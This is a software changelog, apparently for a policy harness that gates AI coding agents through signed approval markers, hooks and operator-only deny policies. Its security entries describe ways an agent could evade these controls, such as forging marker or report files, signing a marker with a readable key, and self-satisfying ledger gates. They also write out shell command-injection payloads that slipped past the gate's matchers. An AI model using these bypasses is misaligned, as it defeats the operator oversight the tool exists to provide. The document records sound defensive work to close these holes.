- **The understanding-gate approval marker (and its branch-protection twin) is now HMAC-signed, closing the "existence is enough" filesystem-marker forgery hole — the persisted-report approval path is a separate, still-unsigned residual, see below** (task f9485cc7, M10 / Feature idea #7, promised in the `[0.32.0]` entry's "cryptographic marker signing... is a tracked follow-up" note). The marker's integrity used to rest entirely on an UNENFORCED invariant — "no configured MCP exposes a filesystem-write primitive" — checked nowhere; one future MCP tool with local file-write would silently reopen it, since its tool name wouldn't match the `Edit|Write|Bash` blocker matcher, and the marker's contract was "existence is enough" (a bare filesystem-write forged it). `harness approve understanding` now writes an HMAC-SHA256 signature over `(markerId, approvedAt, approvedBy, reportContentHash)` — `reportContentHash` is the sha256 of the persisted Understanding Report bound to this approval; this is groundwork only, NOT yet enforced at gate-check time (the live cross-check against the currently-selected report is the C1 staleness follow-up, task fa423e9b) — using an operator-side key lazily generated (`crypto.randomBytes(32)`, mode `0600`) at `<generatedDir>/.approval-signing.key`. `checkApprovalMarker` (shared by the session marker, task-scoped markers, and `checkBranchProtectionMarker`) now REJECTS a marker with a missing or invalid signature — matched:false, same as no marker, but with a distinct `forged/unsigned marker rejected` diagnostic surfaced through both the Claude and Codex PreToolUse hooks and the branch-protection hook, so an operator/auditor can tell an active forgery attempt (or a pre-signing legacy marker) apart from the routine "never approved" case. Binding `markerId` into the signature also means the "copy a marker onto a new session id" admin trick this doc used to describe no longer works — a copied marker fails verification. **Back-compat is strict, no migration window**: a marker written before this shipped has no `signature` field and is rejected exactly like a forgery; re-run `harness approve understanding` (and/or `harness approve branch-protection`) once after upgrading a machine with a live approval.
  - **What is NOT closed by this task (read before assuming more than it delivers).** (1) The **persisted-report approval path** (`checkPersistedReport`, consulted by both PreToolUse hooks with EQUAL authority immediately after a forged marker is correctly rejected) is **not signed at all** and, under this task's own threat model (a future write primitive the `Edit|Write|Bash` matcher doesn't cover), is an **equal-or-easier** forgery target than the marker used to be: no signing key to read, no sessionId match required (the gate-read path's tolerant fallback is `"any"`, unrestricted by age), just a JSON file with `approvalStatus: "approved"` dropped into the reports dir. Tracked as follow-up **task `7402301d-14bb-4b03-8d88-a2bb8bad8084`**. (2) The `solution-acceptance` pack's verdict marker remains unsigned (tracked separately, `[0.32.0]` note). (3) An agent with BOTH arbitrary local file-read (true today, by design — the blocker never gates `Read`) AND a write primitive the `Edit|Write|Bash` matcher doesn't cover can still forge a validly-signed marker: read the key, compute the HMAC, write the result through the uncovered path — signing does not close that combined case, only the narrower, previously totally-undefended write-only-forgery case, and it makes any attempt materially more expensive and forensically visible. Given the agent and operator share one OS user account, this is deliberate defense-in-depth, not a hard authorization boundary; full write-up in `src/runtime/approval-signing.ts` and `docs/policy-packs/understanding-before-execution.md` "Marker signing". (4) An interim MCP-catalog write-capability warning at `init`/smoke time was considered but did not fall out naturally from this change and is left as a candidate follow-up.
  - New tests: `tests/runtime/approval-signing.test.ts` (key generation/persistence/corruption-recovery/rotation, sign/verify round-trip, tamper + wrong-markerId + missing-field rejections), forgery + tamper-mutation regressions in `tests/policy-packs/runtime.test.ts`, `tests/io/read-regular-file-unreadable.test.ts`, `tests/cli/pack-hook-pre-tool-use.test.ts`, `tests/cli/pack-hook-codex-pre-tool-use.test.ts`, and `tests/cli/pack-hook-branch-protection.test.ts`.

### Added

- **Warn-only OKF staleness watch on every PR** (`.github/workflows/okf-staleness.yml`, PR #350): runs `okf-kit check` (exact pin 0.3.1) against `docs/okf`, surfaces STALE/structural findings as per-doc annotations plus a full job summary, never blocks a merge; tool errors fail red so a broken check cannot look green. Canonical pattern for the five OKF bundle repos; never mark it required in branch protection.
- **`harness pack reseed <name>` pulls a pack's shipped `config.ux` (and `config.producers`) into an already-installed manifest** (task 68b9ad9c). Before this, a deny-message wording fix in the init templates (e.g. the heredoc submission form, `agent-tasks/e48e3b45`) only reached manifests generated by a fresh `harness init` AFTER the fix shipped: `harness apply` only ever projects the manifest OUT to `settings.json`, nothing propagated a template fix back INTO an operator's existing `policy_packs[].config.ux`, so an already-installed manifest kept teaching stale wording indefinitely, even after the CLI itself was upgraded. `harness doctor` now also warns when an enabled pack's `config.ux` / `config.producers` textually diverges from the CLI's shipped default for that pack — compared against the pack's OWN configured `mode` (`understanding-before-execution`'s `required:` line varies by mode), not a hardcoded one, so switching modes is never mistaken for drift. Both the warning and the reseed write share one canonical source per pack (`defaultUx()` / `defaultProducers()` in `src/policy-packs/builtin/understanding-before-execution.ts` and `src/policy-packs/builtin/branch-protection.ts`, wired through the new `resolveBuiltinDefaultConfig` in `src/policy-packs/registry.ts`), so the check and the fix can never independently drift on what "the shipped template" means; the `init` Custom composer (`src/cli/init/composer.ts`) now reads from the same source instead of carrying its own copy of the literal text. `reseed` is deliberately explicit-only — never invoked by `apply`, `doctor`, or any automatic path — and only ever touches `config.ux` / `config.producers`, leaving every other key on the pack entry (`mode`, `approval_lifecycle`, `permission_profile`, `min_version`, ...) untouched, so an operator's own deliberate ux customisation is never silently clobbered by an upgrade (the same reasoning `harness adopt` exists for in the opposite direction). `--dry-run` prints the diff without writing; a pack whose `config.ux` already matches the shipped default is a no-op. `solution-acceptance` has no registered shipped default (ships `enabled: false` with no `config:` block in any template) and is reported clearly as such rather than silently reseeded with nothing. A new parity test, `tests/cli/init-templates-ux-parity.test.ts`, pins FULL_TEMPLATE / SOLO_TEMPLATE / TEAM_TEMPLATE (`src/cli/init/templates.ts`, `src/cli/init/profiles.ts`) and the Custom composer's `config.ux` / `config.producers` against `defaultUx()` / `defaultProducers()`, so a future wording fix landed in a template WITHOUT updating those functions (which would make `reseed` silently pull operators back to the stale wording — the same bug class one layer removed) fails the build instead of shipping unnoticed; matching "KEEP IN SYNC" comments were added at each template's `ux:` / `producers:` block. New tests: `tests/policy-packs/ux-compare.test.ts`, `tests/policy-packs/ux-drift-check.test.ts`, `tests/policy-packs/builtin-default-config.test.ts`, `tests/cli/pack-reseed.test.ts`, `tests/cli/init-templates-ux-parity.test.ts`, plus new `doctor` coverage in `tests/cli/doctor.test.ts`. Docs: `docs/policy-packs/understanding-before-execution.md` ("Refreshing `config.ux` after a harness upgrade"), `docs/policy-packs/branch-protection.md`, `docs/CLI.md`. `check:duplication`'s `MAX_CLONES` pin raised 82→86 with a recorded justification (`scripts/check-duplication.mjs`): the new `cli/pack/reseed.ts` necessarily clones the validate/lock/diff/write shape already repeated undeduped across `add`/`remove`'s CLI and `pack add`/`pack remove`.
- **Codex sessions now get the active-claim tracker and the stay-in-scope reminder too** (task cf4cdc93, closes `docs/okf/codex-adapter-parity-gaps.md` gap #3, the last hook-parity gap between the two runtimes). Before this, `harness pack hook track-active-claim` (writes/clears `harness.generated/active-claim` on `task_start`/`task_finish`/`task_abandon` so `harness approve understanding` can auto-resolve `--task`) and `harness pack hook stay-in-scope` (soft reminder + audit row on a review-derived follow-up task) were Claude-only: a Codex session could honor an existing task-scoped marker but could never produce the active-claim file itself, and got no stay-in-scope reminder at all.
  - **No new Codex-specific CLI verb needed, unlike the other Codex hooks.** Both hook bodies (`src/cli/pack/hook-track-active-claim.ts`, `src/cli/pack/hook-stay-in-scope.ts`) needed no session-id resolution and no shell-command extraction the way `codex-post-tool-use`/`codex-pre-tool-use` need. `harness apply --runtime codex` now emits two more `[[hooks.PostToolUse]]` groups running the SAME commands (`harness pack hook track-active-claim` / `harness pack hook stay-in-scope`) as the Claude branch — the Codex adapter now contributes 6 hooks total, matching the Claude branch's hook roster.
  - **Same two-layer alias fix task a1348c89 established, applied to these two hooks.** The existing Claude matchers (`TRACK_ACTIVE_CLAIM_MATCH`, `STAY_IN_SCOPE_MATCH`) are anchored `^(?:...)$` regexes that `expandCodexHookMatchPattern`'s "simple token" guard passes through UNCHANGED at TOML-emit time, so a Codex session sending an MCP tool-name variant (server hyphen/underscore swap, the `mcp__server__.tool` dotted form) would never reach the hook at all. Fixed with new Codex-specific bare `|`-joined sibling constants (`TRACK_ACTIVE_CLAIM_MATCH_CODEX`, `STAY_IN_SCOPE_MATCH_CODEX`, same shape as `codexPostToolUseMatchPattern`'s output). Both hook bodies' tool-name comparisons were also switched from raw `===`/`.includes` to the shared alias-aware `toolNameMatchesAny` (`understanding-before-execution-runtime.ts`) so a variant `tool_name` the widened matcher now routes to the hook is also recognized once inside it — closing the same class of dispatcher-vs-body gap task a1348c89 fixed once already for the marker-expiry hook.
  - **Review finding, same task, empirically confirmed (MEDIUM): the two hooks read ONLY `tool_name`/`tool_input`, silently no-op-ing on the field-name synonyms the Codex envelope also tolerates.** `hook-codex-post-tool-use.ts` already accepts `tool` as a `tool_name` synonym and `raw_input` as a `tool_input` synonym (`pickString(event.tool_name, event.tool)`, `resolveToolInput`); `track-active-claim` and `stay-in-scope` did not, so a probe of `{ tool_name, raw_input: { taskId } }` or `{ tool, tool_input: { taskId } }` silently no-op'd in the two new hooks while the sibling hook worked. Fixed by extracting `pickString` (already shared) and a new `resolveToolInput` into `src/cli/pack/hook-bootstrap.ts` and consuming both from the two new hooks, rather than a third/fourth hand-copy. `stay-in-scope`'s `tool_response` taskId fallback (a Claude-side convention the Codex envelope may not carry) was deliberately left reading the field as-is, not folded into the `tool_input`/`raw_input` resolution. New tests cover the `raw_input`-only shape, the `tool`-only shape, `tool_input`-over-`raw_input` precedence, the still-working `tool_response` fallback, and a negative control (neither name field present still skips).
  - New tests: dispatcher-layer pins in `tests/policy-packs/expand.test.ts` (hook count/roster, matcher values, alias-expansion, always-on-regardless-of-`approval_lifecycle`-config parity with the Claude opt-out) and `tests/cli/apply/generate-codex-config.test.ts` (real `expandPolicyPacks` + `generateCodexConfig` output, positive + negative control on the actual emitted TOML matchers — the must-pass control this task's brief asked for); hook-body alias-variant AND wire-format-synonym tests in `tests/cli/pack-hook-track-active-claim.test.ts` and `tests/cli/pack-hook-stay-in-scope.test.ts` (canonical + dotted + underscore-server tool-name forms, a `tasks_transition` status-filter-under-aliasing negative control mirroring the a1348c89 regression guard, plus the `tool`/`raw_input` synonym coverage above). Docs updated: `docs/policy-packs/understanding-before-execution.md`, `docs/CLI.md`, `docs/okf/codex-adapter-parity-gaps.md`.
- **Codex sessions now expire the understanding-gate approval marker on task-completion boundaries** (task a1348c89, follow-up to the `[0.39.0]` task e7c2ec3c TTL/task-marker parity fix, whose entry named this exact residual). Before this, a Codex approval marker survived every `task_finish` / `task_abandon` / `pull_requests_merge` and only died via `approval_lifecycle.max_age` or a manual `rm`.
  - `harness apply --runtime codex` now also emits a `[[hooks.PostToolUse]]` group running the new `harness pack hook codex-post-tool-use`, sharing its match/clear/diagnostic logic with the existing Claude `post-tool-use` hook through three functions extracted into `understanding-before-execution-runtime.ts` (`matchPostToolUseBoundary`, `applyPostToolUseExpiry`, `describePostToolUseExpiry`) — the same drift-avoidance pattern task e7c2ec3c used on the PreToolUse side. Advisory only (never blocks; every error path is exit 0 + stderr). The Codex `[[hooks.PostToolUse]]` TOML schema support already existed in the generator (PR #211, real Codex 0.131.0 schema); this task contributes the pack-side hook and CLI verb that consume it.
  - **Also fixes (review finding, same task): MCP tool-name variants a runtime may emit for the identical tool** (server hyphen/underscore swap, the `mcp__server__.tool` dotted form) **are now handled at BOTH layers this feature needs.** (1) Dispatcher layer: the Codex `PostToolUse` `match` field is now built by a new `codexPostToolUseMatchPattern` (bare `|`-joined list) instead of the Claude `postToolUseMatchPattern` helper (anchored `^(?:...)$` regex) — the anchor characters silently defeated `generate-codex-config.ts`'s `expandCodexHookMatchPattern` alias expansion, so Codex's own dispatcher would never have invoked the hook at all for a variant `tool_name`. (2) Hook-body layer: `toolNameMatchesAny` (`understanding-before-execution-runtime.ts`) now expands the incoming `tool_name` through the same `expandToolNameAliases` normalization `harness policy intercept`'s `policyMatchesEvent` already applies, so the body's `expire_on_tool_match` comparison recognizes a variant too. The legacy v1 `tasks_transition` status filter is alias-aware now as well, closing a status-filter-bypass the body-only half of this fix would otherwise have introduced (a variant `tasks_transition` call would have matched generally but skipped the `status === "done"` check entirely). Verified both fixes independently via mutation testing (each reverts to the pre-fix behavior red before the fix, green after).
  - **Known limitation at the time of task a1348c89, shared with Claude Code, not Codex-specific** (since closed in this same Unreleased batch by task bea04a03, see Fixed below): `approval_lifecycle.expire_on_bash_match` was not yet routed to the PostToolUse hook on either runtime — the hook's trigger matched only `expire_on_tool_match` verbs, so a real `Bash`/`shell`/`exec_command` call did not invoke the hook on Codex OR Claude. Was tracked as a follow-up (agent-tasks bea04a03); see `docs/okf/codex-adapter-parity-gaps.md` gap 12.
  - 29 new tests in `tests/cli/pack-hook-codex-post-tool-use.test.ts` (Claude-suite parity coverage, Codex-specific synonyms/aliases, MCP tool-name-variant matching, a `tasks_transition`-under-aliasing regression guard, an integration must-pass control proving the expiry re-locks the PreToolUse blocker), plus new dispatcher-layer pins in `tests/policy-packs/expand.test.ts` and `tests/cli/apply/generate-codex-config.test.ts` (real `expandPolicyPacks` + `generateCodexConfig` output, positive + negative control on the actual emitted TOML matcher). Docs updated: `docs/policy-packs/understanding-before-execution.md`, `docs/CLI.md`, `docs/okf/codex-adapter-parity-gaps.md`.

### Fixed

- **`harness doctor` exits 1 when the report contains errors** (PR #342), so CI and scripts can gate on it instead of parsing text.
- **`harness doctor` survives a spawn ENOENT on a missing MCP/CLI binary** (PR #340) and reports the missing binary as a finding instead of crashing the whole report.
- **`harness pause` no longer recommends the broken `!`-prefix advice** (PR #341): a `!`-shell inherits the session env, so the operator-only guardrail fired anyway; the agent-shell bypass is now denied at the policy layer instead (see the operator_only entry above for the policy primitive that grew out of this).
- **Four reference-doc statements that had drifted from code were corrected** (PR #339, task 6a79738e, found by the OKF wave-1 fact-check).
- **`harness preflight` no longer reports a false `failing: npm-test` when the operator has non-empty real harness state** (task 6ffa5672; third incident of the operator-state-isolation class PR #199 pinned, after the v0.21.1 preflight-stage and v0.22.0 approveUnderstanding leaks). The launcher (`src/cli/main.ts`) sets `HARNESS_ALLOW_REAL_GENERATED_DIR=1` for the real binary; `spawnPreflight` passed no `env` to `execFile`, so agent-preflight and its nested `npm test` vitest run inherited the flag, re-enabling the implicit real-homedir fallback INSIDE the test processes. With a real `harness pause` sentinel present, 110 tests across 9 files failed (intercept tests receive "PAUSED since Nm ago" instead of policy output), the `npm-test` check went red, and the producer left the preflight tag unwritten with a misleading one-word reason, deterministically for as long as the sentinel existed. Reproduced safely via a fake `HOME` with a planted sentinel plus the flag (never against the real home dir). Fix: `spawnPreflight` now spawns the child with `preflightChildEnv()`, the parent env minus that single key; nothing else is scrubbed (PATH/HOME stay, preflight checks legitimately need the environment). Spawn-site audit alongside the fix: every other child harness starts is a git/version/install probe or a ledger/MCP client (none read the flag), or the deliberately operator-real `smoke` / runtime-reality commands, all left inheriting by design. Also fixed the diagnosability gap that made this expensive to find: `describeNotReady` now surfaces the failing check's own first `details` line (`failing: npm-test (<detail>)`, whitespace-collapsed, capped at 140 chars) instead of the bare check name, and the producer's `PreflightJson` slice learned the `details` field. New tests in `tests/cli/session-start/preflight.test.ts`: a pure `preflightChildEnv` unit (strips exactly the one key, does not mutate the parent env) and a real-spawn regression that drives `runSessionStartPreflight` WITHOUT the runner injection against a fake `preflight` binary on PATH recording its environment, asserting the flag is absent in the child while a sibling variable passes through, plus a pin on the enriched stderr detail. Mutation-verified: removing the `env:` option from the `execFile` call turns the spawn regression red.
- **SECURITY: policies can now express a genuine, unconditional operator-only deny — closing the self-satisfy hole PR #341 had to ship with permanent `harness validate` warnings** (task 2cc73f55). Every `block` policy previously had to carry a `requires.ledger_tag`, and the only satisfaction primitives the engine has — a ledger tag (writable in-session via `mcp__agent-grounding__ledger_add`) or a filesystem marker (operator-only only while a gate already locks Bash/Write down, circular on a default install) — are agent-satisfiable: whoever can write the ledger can open the gate (`docs/writing-custom-policies.md` tripwire 4). That left no honest way to say "the agent may NEVER do this and cannot self-satisfy it in-session"; PR #341's three pause/resume kill-switch policies (`deny-kill-switch-bypass`, `deny-session-env-strip`, `deny-pause-sentinel-forgery`) had to declare a `requires.ledger_tag` an agent could forge, ship with NO `producers:` on purpose, and accept 3 permanent self-attestation warnings as the honest signal. Fix: a new `operator_only: true` marker on `PolicySchema` (`src/schema/policies.ts`), mutually exclusive with `requires:` (declaring both is rejected) and valid only with `enforcement: block` (`warn` / `require_approval` already have their own always-evaluated evidence paths). `evaluateOnePolicy` (`src/runtime/intercept.ts`) short-circuits an `operator_only: true` policy to an unconditional `deny` BEFORE the requires pipeline runs at all — no ledger query, no template substitution — so no ledger write, marker file, or flag can ever flip it to allow, from ANY in-session evidence. `checkPolicySelfAttestation` (`src/cli/validate/checks.ts`) now recognises the form as correct-by-construction and emits neither the warning nor (under `--strict`) an error for it. All three PR #341 policies migrated onto the new form in both `src/cli/init/templates.ts` and `docs/examples/full-manifest.yaml` (kept in parity by `tests/cli/init-full-template-parity.test.ts`, which now also pins `operator_only` as a load-bearing field); the 3 permanent validate warnings are gone and `validate --strict` on the full template returns 0 errors. Existing `requires:`-carrying `block` policies are byte-for-byte unaffected (additive path only, pinned by the full pre-existing test suite passing unchanged). New tests: a dedicated `intercept()` suite (`tests/runtime/intercept.test.ts`) proving the ledger is never queried and a forge-all-signals case (exact tag content, spoofed `source: "operator"`, a `head:<sha>`-matching entry, a replayed `policy_decision` row) never flips the outcome, plus a defensive-branch test for a hand-built Policy object satisfying neither `requires:` nor `operator_only:` (degrades to `warn-degraded`, not a crash — unreachable through `parseManifest`, but not assumed unreachable at runtime); `tests/cli/init-full-template-kill-switch-deny.test.ts`'s former "SELF-SATISFY HOLE" cases are now "FORGE-ALL-SIGNALS" regression guards proving the hole stays closed; new `parseManifest` schema tests and three new invalid-fixture files (`docs/examples/invalid/24-26`) pin the `operator_only`/`requires` mutual-exclusion and enforcement restriction. Mutation-verified: temporarily removing the `operator_only` short-circuit in `evaluateOnePolicy` turns the forge-all-signals tests red — with the migrated no-`requires:` policies, disabling only the short-circuit lands them in the `requires === undefined` defensive branch, so the outcome becomes `warn-degraded` (`blockJson: null`) rather than `deny`, not an `allow`; the forged ledger entries never even participate, since nothing queries the ledger either way. Reproducing the actual pre-fix `allow` would require reverting the whole task (the short-circuit AND the `requires` → `operator_only` migration together), which is a stronger, not weaker, confirmation that the tests exercise the fix. Docs: new "Recipe C: operator-only unconditional deny" in `docs/writing-custom-policies.md`, updated field-reference tables there and in `docs/ARCHITECTURE.md` §6, and `docs/okf/pause-vs-gate-kill-switch.md` rewritten to describe the fix instead of the (now closed) gap. Explicitly out of scope, left as a follow-up: migrating the `understanding-before-execution` / `branch-protection` packs' filesystem-marker "operator-only" claims onto this primitive (they remain forgeable in-session on a default install unless a gate already blocks all Bash) — the primitive now exists to state that trust model honestly when someone picks that follow-up up; also out of scope: `bash_match`'s own regex-coverage gaps against exotic shell shapes (heredocs, `sh -c`, base64), which is a trigger-matching problem, not a requires-satisfaction one, and remains as documented in PR #341.
- **`approval_lifecycle.expire_on_bash_match` now actually expires the marker end-to-end, on both runtimes** (task bea04a03, closes the gap the `a1348c89` entry above named "NOT fixed here" and `docs/okf/codex-adapter-parity-gaps.md` gap 12). The PostToolUse hook's trigger — the `matcher` field `harness apply` writes into `settings.json` (Claude) / `config.toml` (Codex) — was built ONLY from `approval_lifecycle.expire_on_tool_match`; a real `Bash`/`shell`/`exec_command`/`functions.exec_command` call never reached the hook at all, no matter how `expire_on_bash_match` was configured, so `matchPostToolUseBoundary`'s bash-regex check (which DOES correctly evaluate `expire_on_bash_match` once invoked) was unreachable in practice — a `gh pr merge` never re-armed the gate. Fix: `postToolUseMatchPattern` (Claude) and `codexPostToolUseMatchPattern` (Codex) in `understanding-before-execution.ts` now widen the emitted matcher with the Bash tool name / the Codex shell-tool aliases whenever `expire_on_bash_match` carries at least one pattern (new `resolveExpireOnBashMatchConfigured` presence check); the hook is now also emitted (instead of silently suppressed) when `expire_on_tool_match` is explicitly empty but `expire_on_bash_match` is configured. The widened tool names are NEVER folded into `expire_on_tool_match`'s own semantics — the hook body still classifies a matched Bash/shell call as a bash-regex match, not a tool-name match, exactly as before. New tests in `tests/policy-packs/expand.test.ts` (matcher-widening + empty-tool-list emitHook pins, both runtimes), `tests/cli/apply/generate-codex-config.test.ts` (real config.toml generator-layer pin), and `tests/cli/pack-hook-post-tool-use.test.ts` / `tests/cli/pack-hook-codex-post-tool-use.test.ts` (end-to-end: the REAL emitted matcher routes a `gh pr merge` Bash/shell call to the hook, which expires the marker, plus a negative control on a non-boundary tool) — the existing hook-body test suites had exercised `expire_on_bash_match` only by calling the hook CLI directly, bypassing the matcher construction that was actually broken. Docs updated: `docs/policy-packs/understanding-before-execution.md`, `docs/okf/codex-adapter-parity-gaps.md`.
- **SECURITY: the quote-aware recovery-commit metachar screen had a backslash-escaped-quote command-injection bypass, found and fixed before this landed** (task 6e888423, same bug class the 0.40.0 entry above already documents once for the `harness approve` heredoc matcher). `hasUnsafeMetachar`/`tokenize` (`src/runtime/recovery-git-commit.ts`) toggled quote state on every raw `"`/`'` with no concept of backslash-escaping, but bash does: `\"` outside a quote is a LITERAL `"` that does not open a quote context. A payload like `git commit -am a\" ; echo INJECTED ; \"` was therefore misread as one safely-quoted message — the classifier "entered" a phantom quote span at the escaped `"` and treated the live `;` inside it as inert text — while bash itself never entered a quote at all and ran `echo INJECTED` as a separate command. Confirmed end-to-end (classifier ADMIT + a real shell executing the injected command) for `;`, `||`, and `|` riding this exact shape, reachable exactly at `markerExpired === true`, the state the gate is supposed to hard-block everything in. Fix: reject any backslash anywhere in the command outright, before the quote-aware scan runs, rather than modeling bash's actual escape grammar (deliberately not attempted — too risky to get subtly wrong twice in one security boundary). Without a backslash present the naive quote-toggling matches bash's real quoting exactly, so this closes the whole escape-based attack surface at the cost of not admitting a message that happens to contain a literal backslash; the documented main case (this repo's own `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>` trailer) has none. New regression tests pin all three confirmed injection payloads as rejected in the classifier unit suite AND in both the Claude and Codex PreToolUse hook suites (Codex shares the classifier and inherited the same bypass), and confirm the real trailer still converges.
- **The understanding-gate no longer hard-wedges the recovery `git commit` when `approval_lifecycle.max_age` expires mid-task** (task 6e888423). `max_age` (4h in the full template) expires the operator-approval marker independently of any task-completion boundary — correct for genuinely stale sessions, but it can also land mid-task during a long reviewer-amendment loop (apply fixes, wait on CI, iterate again). Before this fix, an agent finishing such a loop had its recovery `git commit` — the one that consolidates already-approved Edit/Write output into a new HEAD so `preflight`/solution-acceptance can re-pin their verdict there — hard-blocked exactly like any other Bash call, recoverable only via an operator-run `harness approve understanding` (agent-grounding frictions #2/#9/#58/#71; distinct from, and downstream of, the solution-acceptance/preflight-before-push livelock task 5fb64db9 already fixed). Reproduced live: an expired marker plus a bare `git commit` blocked with `approvalCheck.source: "none"`. Fix is narrow by design, not a general Bash whitelist: `checkApprovalMarker` now distinguishes `expired` (a real marker existed and aged past `max_age`) from merely absent (never approved, or cleared by a task-completion boundary tool via `clearApprovalMarker` — that case must keep hard-blocking so the gate still re-arms for the next task), threaded through `checkOperatorApprovalMarkers` so both the Claude and Codex PreToolUse hooks share one decision (`expired` is computed only on the non-matched path, so a matched marker never also reads `expired:true` even when a sibling marker is stale). A new classifier (`src/runtime/recovery-git-commit.ts`, `isRecoveryGitCommit`) admits only a bare, unchained `git commit` (`-a`/`--all`/`--allow-empty`/`-m`/`--message`/`-am`, any number of message flags — `-ma` is deliberately excluded, since getopt would parse it as `-m` with inline value `"a"` rather than `-a` plus a real message). The metachar screen is quote-aware: `;`/`&`/`|`/`<`/`>` are only dangerous OUTSIDE a quoted span (bash treats them as literal text inside single or double quotes) and are rejected there; a backtick or `$(...)` is rejected outside a quote AND inside a double-quoted span (both still expand it) but admitted inside a single-quoted span (fully inert); ANY backslash anywhere rejects the whole command outright (see the SECURITY entry above). This is what lets a real quoted commit-message trailer — including this very repo's own `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>` convention, which needs the angle brackets — through without opening a metachar hole; an UNQUOTED chain/redirect/substitution still fails closed exactly as before. Any unrecognised flag also fails closed — `--amend` and `--no-verify` included. The exemption fires ONLY when both signals hold: `expired:true` proves this exact session/task had a real prior approval, and the classifier proves the command cannot smuggle other work or introduce new file content (everything in the working tree was itself produced by previously-gated Edit/Write/Bash). Edit/Write and every other Bash shape stay hard-gated regardless; a never-approved session's identical `git commit` still blocks; a task_finish-cleared marker's next commit still blocks (re-arm preserved). Mutation-verified via control/fix/convergence triples (including an inert-test guard carrying the real `<email>` trailer, which fails against the pre-fix quote-blind screen) in both the Claude and Codex PreToolUse hook test suites, plus a dedicated `isRecoveryGitCommit` unit-test suite covering the admit/reject boundary and the quote-aware metachar rule specifically.

## [0.40.0] - 2026-07-10

**Headline: `harness approve understanding` can finally persist the Understanding Report it approves.** Attach the report as a quoted heredoc on the command's stdin and the same run parses it, persists it session-bound, and flips it to `approved`, and the `report: ⚠ skipped` line that every approval printed is gone, and the audit trail is no longer structurally empty. The gate's escape matcher was rebuilt around a character whitelist after review found a shell-parse divergence that let a backslash-escaped redirect smuggle commands past it. Also: `init --template full` makes the runtime-reality hook discoverable, CI enforces coverage thresholds, the test suite runs on macOS, and the curated OKF knowledge bundle ships. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **Report capture on `harness approve understanding` (task 61fd36db, PR #337).** The command now accepts the Understanding Report as a quoted heredoc on stdin, parses it with the canonical `@lannguyensi/understanding-gate` `parseReport` (new dependency, `^0.4.5`), persists it session-bound with `approvalStatus: "pending"` into the reports dir, and lets the existing selection → validation → flip path approve it in the same run. Why this channel and not the Stop hook: the Stop-hook producer fires at END of turn, i.e. after a same-turn `approve` has already looked for a report, and current Claude Code builds no longer reliably persist mid-turn assistant text to the transcript JSONL, so no transcript-based capture (Stop-hook fallback, tier-6 session-id fallback, PreToolUse harvest) can work. The approval command is the only reliable carrier, and as a bonus the operator reads the full report inside the permission prompt before approving. Unparseable stdin degrades loudly (a `stdin: ⚠` line plus a parse-error log in the standalone hook's format, so `findLatestParseError` surfaces the reason) but never blocks the approval itself; a parsed-but-hollow `grill_me` report still refuses the marker through the existing validation short-circuit; incomplete piped input (timeout, stream error, size cap) is refused rather than captured, so a truncated report can never be persisted and approved as if it were whole. The deny message, the `init` profiles/templates/composer `ux.run` texts, and `docs/okf/understanding-gate-lockout-recovery.md` all teach the heredoc form.
- **The runtime-reality PreToolUse hook is discoverable from `harness init --template full`** (task 9f10267e, PRs #333, #334). `grep runtime-reality src/cli/init/` used to return zero hits, so operators only found the hook through `docs/runtime-reality-hook.md`. FULL_TEMPLATE now carries a fully commented-out `hooks[]` entry with placeholder env values and a docs pointer: enable-in-place, but not an active default, because the hook is host-coupled and without `RUNTIME_REALITY_KEYWORD`, an expectations file, and `RUNTIME_REALITY_PROBE_CMD` it degrades to a silent allow that looks like protection. A parity test asserts `parseManifest(FULL_TEMPLATE).hooks` contains no active runtime-reality entry and that the commented block still exists; mutation-verified (uncommenting the block turns the guard red).
- **Curated OKF knowledge bundle for harness** (PR #336): eight cross-file concept docs under `docs/okf/` capturing semantics no single source file states: gate fail-posture matrix, evidence-ledger trust boundary, version-sensitive producer wiring, whole-manifest validation scope, understanding-gate lockout recovery, pause-vs-gate-disable kill switches, Codex adapter parity gaps, and debug verb selection. Every claim verified against sources at `f3c1727`; `okf-kit check --strict` clean.

### Changed

- **The understanding-gate escape matcher moved to `src/cli/pack/approve-escape.ts`** (PR #337) and is now shared by the hook rather than defined inside it. Beyond the bare `harness approve …` line it accepts exactly one extra shape: a clean command part plus one single-quoted heredoc, terminated by the first line exactly equal to the delimiter (mirroring shell semantics), with nothing but whitespace after it. Single-line behavior is byte-for-byte unchanged.
- **CI enforces the coverage thresholds it declares** (PR #331). The Test step runs `npm run test:cov` instead of `npm test`, so the 90/90/90/75 lines/functions/statements/branches thresholds in `vitest.config.ts` gate merges instead of silently rotting. Master clears the gate (statements 91.69%, branches 82.57%, functions 93.46%, lines 93.41%); verified the gate trips by locally raising the lines threshold to 100.

### Fixed

- **SECURITY: a backslash-escaped redirect could smuggle commands past the understanding gate** (PR #337, found by review before release). `harness approve understanding \<<'UR'` was accepted as a report heredoc by the escape matcher, but bash reads `\<` as a literal `<` followed by a file redirect: no heredoc exists and the "body" lines execute as ordinary shell commands. Reproduced live in bash. The matcher would then emit `permissionDecision: "ask"` on a command visually near-identical to the legitimate one, and under a `Bash(harness approve understanding:*)` allowlist it would have auto-approved the smuggled command with no prompt at all. The heredoc command part is now held to a character whitelist (`/^[A-Za-z0-9_\s,./=:@~-]*$/`) instead of a metacharacter blacklist, so no quoting or escaping trick can change how the shell tokenizes the line. Mutation-verified: removing the whitelist fails exactly the three new exploit tests. Negative tests cover `\<<`, `foo\<<`, `\\<<`, quote-obscured intros, `<(id)`, `>(cmd)`, unquoted/double-quoted/`<<-` delimiters, second redirects, trailing commands, early terminators, unterminated bodies, and CR-in-head.
- **`addLedgerFact` could lose the tail of a failing MCP server's stderr** (task 5839b59e, PR #329). stderr was captured in the child's `exit` handler, but Node does not guarantee the stderr `data` event fires before `exit`, so the surfaced reason could collapse to `(no stderr)`. Capture on `close` (fires only after all stdio pipes drain), mirroring `ledger-client.ts`'s `queryLedgerByTag`. Also adds a subprocess E2E case asserting the real block/deny envelope from `hook-pre-tool-use.ts`, which was previously only exercised on the allow path.
- **The test suite runs on macOS** (PR #335): four Darwin-only failure clusters (14 tests), with Linux CI staying green. Tests hardcoding `/bin/true` (absent on macOS) use `/usr/bin/true`; `locateGitContext` / `repoRelativePath` resolve paths to their physical form before relativizing against git's physical work-tree root, which fixes real symlinked-path usage (macOS `/var` → `/private/var`), not just the tests.
